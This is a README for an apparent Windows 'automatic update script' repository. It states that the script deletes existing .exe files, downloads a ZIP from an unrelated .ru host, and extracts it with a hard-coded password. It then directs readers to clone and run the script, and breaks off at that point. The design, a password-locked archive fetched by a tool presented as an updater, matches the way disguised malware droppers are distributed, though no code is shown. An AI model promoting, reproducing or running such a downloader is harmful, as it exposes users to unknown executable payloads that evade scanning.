# Automatic Update Script

## Overview

The script handles the cleanup of old executable files, downloads the latest update, extracts the update package using multiple tools, and performs final cleanup. It is designed to work in a Windows environment.

## Features

- **Clean Up Old Executables**: Removes any existing `.exe` files from the current directory.
- **Download Latest Update**: Downloads a ZIP file from a specified URL using `curl` or PowerShell if `curl` is not available.
- **Extract Update Package**: Uses 7-Zip, WinRAR, or PowerShell for extraction based on availability.
  - If 7-Zip is not found, it prompts the user to download and install 7-Zip.
  - If neither 7-Zip nor WinRAR is available, it falls back to PowerShell for downloading 7-Zip.
- **Clean Up**: Deletes the ZIP file after extraction to save space.
- **Final Messages**: Provides a clear exit message.

## Script Details

- **Current Directory**: Operates in the directory where the script is executed.
- **Download URL**: `https://iammaddog.ru/deadlock`
- **ZIP Filename**: `update.zip`
- **Extraction Path**: The current directory.
- **ZIP Password**: `666`
- **7-Zip Installer URL**: `https://www.7-zip.org/a/7z1900-x64.exe`
- **7-Zip Installer Filename**: `7z_installer.exe`

## Requirements

- **curl**: For downloading the update. If not available, PowerShell is used.
- **7-Zip**: Optional, used for extraction if available.
- **WinRAR**: Optional, used for extraction if available.
- **PowerShell**: Used for extraction if neither 7-Zip nor WinRAR is present.

## Usage

1. **Clone the Repository**

   ```bash
   git clone https://github.com/C-ATMOSPHERE/iammaddog.git
